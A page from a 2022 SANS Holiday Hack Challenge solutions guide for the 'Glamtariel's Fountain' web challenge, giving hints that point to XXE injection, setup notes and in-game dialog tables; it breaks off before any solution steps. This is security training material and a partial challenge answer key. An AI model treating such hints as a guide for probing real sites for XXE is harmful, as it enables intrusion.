
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Paul DeCamp (KringleCon Attendee: Nutmeg)">
      
      
        <link rel="canonical" href="https://pdecamp.github.io/HHC2022-Solutions-Guide/quests/Recover_the_Web_Ring/10_Glamtariels_Fountain/">
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.3">
    
    
      
        <title>Glamtariel's Fountain - 2022 SANS Holiday Hack Challenge Solutions Guide</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.edf004c2.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.e6a45f82.min.css">
        
          
          
          <meta name="theme-color" content="#4cae4f">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="red">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#glamtariels-fountain" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="2022 SANS Holiday Hack Challenge Solutions Guide" class="md-header__button md-logo" aria-label="2022 SANS Holiday Hack Challenge Solutions Guide" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            2022 SANS Holiday Hack Challenge Solutions Guide
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Glamtariel's Fountain
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="2022 SANS Holiday Hack Challenge Solutions Guide" class="md-nav__button md-logo" aria-label="2022 SANS Holiday Hack Challenge Solutions Guide" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    2022 SANS Holiday Hack Challenge Solutions Guide
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        Welcome
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
      
      
      
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      
      
        <label class="md-nav__link" for="__nav_2">
          Quests
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Quests" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Quests
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
      
      
      
        
          
            
          
        
      
      
        
        
        <div class="md-nav__link md-nav__link--index ">
          <a href="../../KringleCon_Orientation/">KringleCon Orientation</a>
          
        </div>
      
      <nav class="md-nav" aria-label="KringleCon Orientation" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_1">
          <span class="md-nav__icon md-icon"></span>
          KringleCon Orientation
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
      
      
      
        
          
            
          
        
          
        
          
        
          
        
      
      
        
        
        <div class="md-nav__link md-nav__link--index ">
          <a href="../../Recover_the_Tolkien_Ring/">Recover the Tolkien Ring</a>
          
            <label for="__nav_2_2">
              <span class="md-nav__icon md-icon"></span>
            </label>
          
        </div>
      
      <nav class="md-nav" aria-label="Recover the Tolkien Ring" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_2">
          <span class="md-nav__icon md-icon"></span>
          Recover the Tolkien Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Tolkien_Ring/02_Wireshark_Practice/" class="md-nav__link">
        Wireshark Practice
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Tolkien_Ring/03_Windows_Event_Logs/" class="md-nav__link">
        Windows Event Logs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Tolkien_Ring/04_Suricata_Regatta/" class="md-nav__link">
        Suricata Regatta
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_3" type="checkbox" id="__nav_2_3" >
      
      
      
        
          
            
          
        
          
        
          
        
          
        
      
      
        
        
        <div class="md-nav__link md-nav__link--index ">
          <a href="../../Recover_the_Elfen_Ring/">Recover the Elfen Ring</a>
          
            <label for="__nav_2_3">
              <span class="md-nav__icon md-icon"></span>
            </label>
          
        </div>
      
      <nav class="md-nav" aria-label="Recover the Elfen Ring" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_3">
          <span class="md-nav__icon md-icon"></span>
          Recover the Elfen Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Elfen_Ring/05_Clone_with_a_Difference/" class="md-nav__link">
        Clone with a Difference
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Elfen_Ring/06_Prison_Escape/" class="md-nav__link">
        Prison Escape
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Elfen_Ring/07_Jolly_CICD/" class="md-nav__link">
        Jolly CI/CD
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" checked>
      
      
      
        
          
            
          
        
          
        
          
        
          
        
      
      
        
        
        <div class="md-nav__link md-nav__link--index ">
          <a href="../">Recover the Web Ring</a>
          
            <label for="__nav_2_4">
              <span class="md-nav__icon md-icon"></span>
            </label>
          
        </div>
      
      <nav class="md-nav" aria-label="Recover the Web Ring" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_4">
          <span class="md-nav__icon md-icon"></span>
          Recover the Web Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../08_Boria_PCAP_Mining/" class="md-nav__link">
        Boria PCAP Mining
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../09_Open_the_Boria_Mine_Door/" class="md-nav__link">
        Open the Boria Mine Door
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Glamtariel's Fountain
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Glamtariel's Fountain
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#hints-and-resources" class="md-nav__link">
    Hints and Resources
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#setup" class="md-nav__link">
    Setup
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    Solution
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_5" type="checkbox" id="__nav_2_5" >
      
      
      
        
          
            
          
        
          
        
          
        
          
        
      
      
        
        
        <div class="md-nav__link md-nav__link--index ">
          <a href="../../Recover_the_Cloud_Ring/">Recover the Cloud Ring</a>
          
            <label for="__nav_2_5">
              <span class="md-nav__icon md-icon"></span>
            </label>
          
        </div>
      
      <nav class="md-nav" aria-label="Recover the Cloud Ring" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_5">
          <span class="md-nav__icon md-icon"></span>
          Recover the Cloud Ring
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Cloud_Ring/11_AWS_CLI_Intro/" class="md-nav__link">
        AWS CLI Intro
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Cloud_Ring/12_Trufflehog_Search/" class="md-nav__link">
        Trufflehog Search
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Cloud_Ring/13_Exploitation_via_AWS_CLI/" class="md-nav__link">
        Exploitation via AWS CLI
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_6" type="checkbox" id="__nav_2_6" >
      
      
      
        
          
            
          
        
          
        
          
        
          
        
      
      
        
        
        <div class="md-nav__link md-nav__link--index ">
          <a href="../../Recover_the_Burning_Ring_of_Fire/">Recover the Burning Ring of Fire</a>
          
            <label for="__nav_2_6">
              <span class="md-nav__icon md-icon"></span>
            </label>
          
        </div>
      
      <nav class="md-nav" aria-label="Recover the Burning Ring of Fire" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_6">
          <span class="md-nav__icon md-icon"></span>
          Recover the Burning Ring of Fire
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Burning_Ring_of_Fire/14_Buy_a_Hat/" class="md-nav__link">
        Buy a Hat
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Burning_Ring_of_Fire/15_Blockchain_Divination/" class="md-nav__link">
        Blockchain Divination
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recover_the_Burning_Ring_of_Fire/16_Exploit_a_Smart_Contract/" class="md-nav__link">
        Exploit a Smart Contract
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_7" type="checkbox" id="__nav_2_7" >
      
      
      
        
          
            
          
        
      
      
        
        
        <div class="md-nav__link md-nav__link--index ">
          <a href="../../Visit_Santa_in_the_Castle/">Visit Santa in the Castle</a>
          
        </div>
      
      <nav class="md-nav" aria-label="Visit Santa in the Castle" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_7">
          <span class="md-nav__icon md-icon"></span>
          Visit Santa in the Castle
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      
      
        
          
        
          
        
          
        
          
        
      
      
        <label class="md-nav__link" for="__nav_3">
          Extras
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Extras" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Extras
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../extras/Hidden_Chests/" class="md-nav__link">
        Hidden Chests
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../extras/Recipe/" class="md-nav__link">
        Lembanh Recipie
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../extras/Ram_Bambidil/" class="md-nav__link">
        Ron Bambidil
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../extras/Jason/" class="md-nav__link">
        Jason
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#hints-and-resources" class="md-nav__link">
    Hints and Resources
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#setup" class="md-nav__link">
    Setup
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    Solution
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                

<h1 id="glamtariels-fountain">Glamtariel's Fountain</h1>
<div class="admonition summary">
<p class="admonition-title">Glamtariel's Fountain<br><em>Difficulty</em>: <span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span></p>
<p>Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.</p>
</div>
<h2 id="hints-and-resources">Hints and Resources</h2>
<details class="hint">
<summary>Hint from Hal Tandybuck after completing Part 1 of the <a href="../09_Open_the_Boria_Mine_Door/">Boria Mine Door</a></summary>
<p><strong>Significant Case</strong><br>
Early parts of this challenge can be solved by focusing on Glamtariel's WORDS.</p>
</details>
<details class="hint">
<summary>Hint from Hal Tandybuck after completing Part 2 of the <a href="../09_Open_the_Boria_Mine_Door/">Boria Mine Door</a></summary>
<p><strong>eXternal Entities</strong><br>
Sometimes we can hit web pages with <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XXE</a> when they aren't expecting it!</p>
</details>
<details class="hint">
<summary>Other Resources</summary>
<p><strong>Guide on XXE Injection</strong><br>
<a href="https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/">https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/</a><br>
<br>
<strong>Burp Suite Community Edition</strong><br>
<a href="https://portswigger.net/burp/communitydownload">https://portswigger.net/burp/communitydownload</a></p>
</details>
<h2 id="setup">Setup</h2>
<p>Clicking on the fountain opens the web site <a href="https://glamtarielsfountain.com/">https://glamtarielsfountain.com/</a> in a separate tab / window.  The answer is submitted in your badge, so this challenge can be completed directly from this link at any time.</p>
<p>When the web site opens it can be a little unclear what you are actually supposed to do.  Each page of the site will have two main elements.</p>
<ul>
<li>The Princess</li>
<li>The Fountain</li>
</ul>
<p>Additionally, there will be 4 objects that can be clicked and dragged onto either the princess or the fountain.  Depending on which one is dragged where, the princess and the fountain will tell you different things.  It's also possible to drop an object onto neither the princess or the fountain, but this will result in the same dialog no matter which object it is.</p>
<p>The starting page has the following objects.</p>
<ul>
<li>Santa</li>
<li>Candy Cane</li>
<li>Elf</li>
<li>Ice Cube</li>
</ul>
<p>All 9 dialog options for the first set of objects are provided in the table below.</p>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>any</td>
<td>empty space</td>
<td>Some that are silver may never shine<br>Some who wander may get lost<br>All that are curious will eventually find<br>What others have thrown away and tossed</td>
<td>From water and cold new ice will form<br>Frozen spires from lakes will arise<br>Those shivering who weather the storm<br>Will learn from how the TRAFFIC FLIES</td>
</tr>
<tr>
<td>Santa</td>
<td>Princess</td>
<td>I don't know why anyone would ever ask me to TAMPER with the cookie recipe. I know just how Kringle likes them.</td>
<td>Glamtariel likes to keep Kringle happy so that he and the elves will visit often</td>
</tr>
<tr>
<td>Santa</td>
<td>Fountain</td>
<td>Kringle really likes the cookies here so I always make them the same way</td>
<td>Kringle really dislikes it if anyone tries to TAMPER with the cookie recipe Glamtariel uses.</td>
</tr>
<tr>
<td>Candycane</td>
<td>Princess</td>
<td>Mmmmm, I love Kringlish Delight!</td>
<td>I think Glamtariel is thinking of a different story.</td>
</tr>
<tr>
<td>Candycane</td>
<td>Fountain</td>
<td>I think fountain gets confused about things sometimes.</td>
<td>Zany Zonka makes the best of these!</td>
</tr>
<tr>
<td>Ice Cube</td>
<td>Princess</td>
<td>No worries, it doesn't get nearly as cold here as it did in Melgarexa. Brrrr, that was one frigid trip.</td>
<td>I think it's a perfect temperature here.</td>
</tr>
<tr>
<td>Ice Cube</td>
<td>Fountain</td>
<td>It's always great when old friends visit!</td>
<td>Hey, its Chilly Icycube, my old friend! I remember when they were but a small drop in the Dimrofel.</td>
</tr>
<tr>
<td>Elf</td>
<td>Princess</td>
<td>I helped the elves to create the PATH here to make sure that only those invited can find their way here</td>
<td>I wish the elves visited more often.</td>
</tr>
<tr>
<td>Elf</td>
<td>Fountain</td>
<td>I don't get away as much as I used to. I think I have one last trip in me which I've probably put off for far too long.</td>
<td>The elves do a great job making PATHs which are easy to follow once you see them.</td>
</tr>
</tbody>
</table>
<p>Focusing on some of the dialog and especially the words in CAPS, we can deduce the following information from this first set of dialogs.</p>
<ul>
<li>TRAFFIC FLIES likely refers to us watching the web traffic to the site, implying that this will be necessary to complete the challenge</li>
<li>Several references to TAMPER are made, with warnings that Santa would not like it if someone tampered with the Princesses cookie recipe.  This is a hint that tampering with the site cookies is not advisable, and is in fact unnecessary to complete the challenge.</li>
<li>PATH is telling us that at some point in the challenge we need to determine a directory path or similar</li>
</ul>
<p>After completing the first 8 dialog options, a new set of objects are provided</p>
<ul>
<li>Green Ring</li>
<li>Igloo</li>
<li>Ice Boat</li>
<li>Star</li>
</ul>
<p>This time 8 dialog options are available, as the star gives the same regardless of which object it's dropped on.</p>
<table>
<thead>
<tr>
<th>Object</th>
<th>Dropped On</th>
<th>Princess</th>
<th>Fountain</th>
</tr>
</thead>
<tbody>
<tr>
<td>any</td>
<td>empty space</td>
<td>Some that are silver may never shine<br>Some who wander may get lost<br>All that are curious will eventually find<br>What others have thrown away and tossed</td>
<td>From water and cold new ice will form<br>Frozen spires from lakes will arise<br>Those shivering who weather the storm<br>Will learn from how the TRAFFIC FLIES</td>
</tr>
<tr>
<td>Green Ring</td>
<td>Princess</td>
<td>I do have a small ring collection, including one of these.</td>
<td>I think Glamtariel likes rings a little more than she lets on sometimes.</td>
</tr>
<tr>
<td>Green Ring</td>
<td>Fountain</td>
<td>Careful with the fountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed!</td>
<td>Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPointed. Please click away that ominous eye!</td>
</tr>
<tr>
<td>Igloo</td>
<td>Princess</td>
<td>It's understandable to wonder about home when one is adventuring.</td>
<td>I think I'd worry too much if I ever left this place.</td>
</tr>
<tr>
<td>Igloo</td>
<td>Fountain</td>
<td>The fountain shows many things, some more helpful than others. It can definitely be a poor guide for decisions sometimes.</td>
<td>What's this? Fake tickets to get in here? Snacks that don't taste right? How could that be?</td>
</tr>
<tr>
<td>Ice Boat</td>
<td>Princess</td>
<td>These ice boat things would have been helpful back in the day. I still remember when Boregoth stole the Milsarils, very sad times.</td>
